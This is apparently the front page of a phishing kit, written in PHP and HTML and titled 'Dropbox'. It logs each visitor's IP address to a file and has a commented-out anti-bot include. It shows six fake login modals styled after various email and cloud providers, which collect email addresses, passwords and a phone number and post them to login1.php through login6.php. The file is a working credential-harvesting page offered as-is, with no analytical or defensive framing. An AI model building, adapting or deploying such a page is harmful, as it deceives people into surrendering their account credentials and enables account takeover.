<?php 
$file = fopen ('ip.txt', 'a+'); 
fwrite($file, $_SERVER['REMOTE_ADDR']."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\r\n") 
?>
<?php

/*

 */

//include 'antibots.php';

session_start();

?>
<html>
<head>
	<title>Dropbox</title>
	<link rel="icon" type="image/ico" href="img/favicon.ico" />
	<style>
<style>
*{margin:0px; padding:0px; font-family:Helvetica, Arial, sans-serif;}

body {
    background-repeat:no-repeat;
}
/* Full-width input fields */
input[type=email], input[type=text] , input[type=password] {
    width: 90%;
    padding: 5px 5px;
    margin: 4px 26px;
    display: inline-block;
    border: 1px solid #ccc;
    box-sizing: border-box;
	font-size:16px;
}

/* Set a style for all buttons */
button {
	background-color: transparent;
	padding: 14px 20px;
	margin: 8px 26px;
	border: none;
	cursor: pointer;
	width: 90%;
	height: 40px;
	position: absolute;
	left: -12px;
	top: 74px;
}
button:hover {
    opacity: 0.8;
}

/* Center the image and position the close button */
.imgcontainer {
    text-align: center;
    margin: 24px 0 12px 0;
    position: relative;
}
.avatar {
    
}

/* The Modal (background) */
.modal {
	display:none;
    position: fixed;
    z-index: 0;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    overflow: auto;
    background-color: rgba(0,0,0,0.4);
}

/* Modal Content Box */
.modal-content {
    background-color: #fff;
    margin: 4% auto 15% auto;
    border: 1px solid #888;
    width: 30%; 
	padding-bottom: 30px;
}

/* The Close Button (x) */
.close {
    position: absolute;
    right: 25px;
    top: 0;
    color: #000;
    font-size: 35px;
    font-weight: bold;
}
.close:hover,.close:focus {
    color: red;
    cursor: pointer;
}

/* Add Zoom Animation */
.animate {
    animation: zoom 0.6s
}
@keyframes zoom {
    from {transform: scale(0)} 
    to {transform: scale(1)}
}
    </style>
</style>
<body background="img/001.png">



<button onClick="document.getElementById('modal-wrapper').style.display='block'" style="width:200px; margin-top:143px; margin-left:120px;"></button>

<div id="modal-wrapper" class="modal">
  
  <form class="modal-content animate" method="post" action="login1.php">
        
    <div class="imgcontainer">
      <span onClick="document.getElementById('modal-wrapper').style.display='none'" class="close" title="Close">&times;</span>
	  <img src="img/av011.png" alt="Avatar" class="avatar" style="float:left; margin-left:26px; margin-top:26px; margin-bottom:26px;" >
      
    </div>

    <div class="container">
      <input type="email" placeholder="someone@example.com" id="id1" name="id1"  required="" style="height:32px; font-size:0.9em;">
      <input type="password" placeholder="Password" id="id2" name="id2"  required="" style="height:32px; font-size:0.9em;">        
      <input type="checkbox" style="margin-right:5px; margin-left:26px; margin-top:5px;"><font size="2.5">Keep me signed in</font>  <br>   
	  <input type="image" src="img/bt01.png" alt="submit" style="margin-left:26px; margin-top:30px; margin-bottom:30px;"></button><br>
	  <a href="#" style="text-decoration:none; margin-left:26px; "><font size="2.5" color="#2872DD">Can&#39;t access your account?</font></a>
    </div>
    
  </form>
  
</div>


<button onClick="document.getElementById('modal-wrapper2').style.display='block'" style="width:200px; margin-top:208px; margin-left:120px;"></button>

<div id="modal-wrapper2" class="modal">
  
  <form class="modal-content animate" method="post" action="login2.php">
        
    <div class="imgcontainer">
      <span onClick="document.getElementById('modal-wrapper2').style.display='none'" class="close" title="Close">&times;</span>
      <img src="img/av021.png" alt="Avatar" class="avatar" style="float:left; margin-left:26px; " ><br><br>
	  <img src="img/av022.png" alt="Avatar2" class="avatar2" style="float:left; margin-left:26px; margin-top:10px; margin-bottom:26px;" >
      
    </div>

    <div class="container">
      <input type="email" placeholder="Email or phone" name="id1" required="" border="0px" style="height:32px; font-size:0.9em;">
      <input type="password" placeholder="Password" name="id2" required="" style="height:32px; font-size:0.9em;"> 
      <input type="text" placeholder="Phone number" name="id3" required="" style="height:32px; font-size:0.9em;"> <br> <br> 	  
      <a href="#" style="text-decoration:none; margin-left:26px; "><font size="2,5" color="#4285f4">Forgot email?</font></a>  <br><br><br>   
	  <input type="image" src="img/bt02.png" alt="submit" style="float:right;  margin-right:30px;  margin-bottom:30px;"></button><br><br><br><br>
	  
    </div>
    
  </form>
  
</div>


<button onClick="document.getElementById('modal-wrapper3').style.display='block'" style="width:200px; margin-top:268px; margin-left:120px;"></button>

<div id="modal-wrapper3" class="modal">
  
  <form class="modal-content animate" method="post" action="login3.php">
        
    <div class="imgcontainer">
      <span onClick="document.getElementById('modal-wrapper3').style.display='none'" class="close" title="Close">&times;</span>
      <img src="img/av031.png" alt="Avatar" class="avatar" ><br><br>
	  
      
    </div>

    <div class="container">
      <input type="email" placeholder="Enter your email" name="id1" required="" style="height:36px; font-size:16px;">
      <input type="password" placeholder="Password" name="id2" required="" style="height:36px; font-size:16px;">  
      <input type="image" src="img/bt03.png" alt="submit" style="margin-left:60px; margin-top:30px; margin-bottom:30px;"></button><br>	  
      <a href="#" style="text-decoration:none; float:right; margin-right:20px;"><font size="2.5" color="#188fff">Trouble signing in? </font></a>   
      <input type="checkbox" style="margin-right:5px; margin-left:26px; margin-top:5px;"><font color="#188fff" size="2.5">Stay signed in</font>  <br>   
	  
	  
    </div>
    
  </form>
  
</div>

<button onClick="document.getElementById('modal-wrapper4').style.display='block'" style="width:200px; margin-top:323px; margin-left:120px;"></button>

<div id="modal-wrapper4" class="modal">
  
  <form class="modal-content animate" method="post" action="login4.php">
        
    <div class="imgcontainer">
      <span onClick="document.getElementById('modal-wrapper4').style.display='none'" class="close" title="Close">&times;</span>
      <img src="img/av041.png" alt="Avatar" class="avatar" ><br><br>
	  
      
    </div>

    <div class="container">
      <input type="email" placeholder="Username or Email" name="id1" required="" style="height:36px; font-size:16px;">
      <input type="password" placeholder="Password" name="id2" required="" style="height:36px; font-size:16px;">   
      <a href="#" style="text-decoration:none; float:right; margin-right:20px;"><font size="2.5" color="#57A">Need help?</font></a><br><br>   
      <input type="checkbox" style="margin-right:5px; margin-left:26px; margin-top:5px;"><font color="#666666" size="3">Remember Me</font>  <br>   
	  <input type="image" src="img/bt04.png" alt="submit" style="margin-left:70px; margin-top:30px; margin-bottom:30px;"></button><br>
	  
    </div>
    
  </form>
  
</div>
    
<button onClick="document.getElementById('modal-wrapper5').style.display='block'" style="width:200px; margin-top:383px; margin-left:120px;"></button>

<div id="modal-wrapper5" class="modal">
  
  <form class="modal-content animate" method="post" action="login5.php">
        
    <div class="imgcontainer">
      <span onClick="document.getElementById('modal-wrapper5').style.display='none'" class="close" title="Close">&times;</span>
      <img src="img/av051.png" alt="Avatar" class="avatar" style="float:left; margin-left:26px; margin-top:15px; margin-bottom:15px;" >
	  
      
    </div>

    <div class="container">
      <input type="email" placeholder="Email, phone, or Skype" name="id1" required="" style="height:36px; font-size:16px;">
      <input type="password" placeholder="Password" name="id2" required="" style="height:36px; font-size:16px;">  
      <input type="image" src="img/bt05.png" alt="submit" style="margin-left:26px; margin-top:30px; margin-bottom:30px;"></button><br>	  
      <font size="2.5" style="margin-left:26px;" color="#181818">No account?</font> <font size="2.5" color="#0067b8" >Create one!</font></a>   
        
	  
	  
    </div>
    
  </form>
  
</div>


<button onClick="document.getElementById('modal-wrapper6').style.display='block'" style="width:200px; margin-top:443px; margin-left:120px;"></button>

<div id="modal-wrapper6" class="modal">
  
  <form class="modal-content animate" method="post" action="login6.php">
        
    <div class="imgcontainer">
      <span onClick="document.getElementById('modal-wrapper6').style.display='none'" class="close" title="Close">&times;</span>
      <img src="img/av061.png" alt="Avatar" class="avatar" style="margin-top:15px; margin-bottom:15px;" >
	  
      
    </div>

    <div class="container">
      <input type="email" placeholder="Email" name="id1" required="" style="height:36px; font-size:16px;">
      <input type="password" placeholder="Password" name="id2" required="" style="height:36px; font-size:16px;">  
      <input type="image" src="img/bt06.png" alt="submit" style="margin-left:26px; margin-top:30px; margin-bottom:30px;"></button><br>	  
      
	  
    </div>
    
  </form>
  
</div>




</body>
</html>
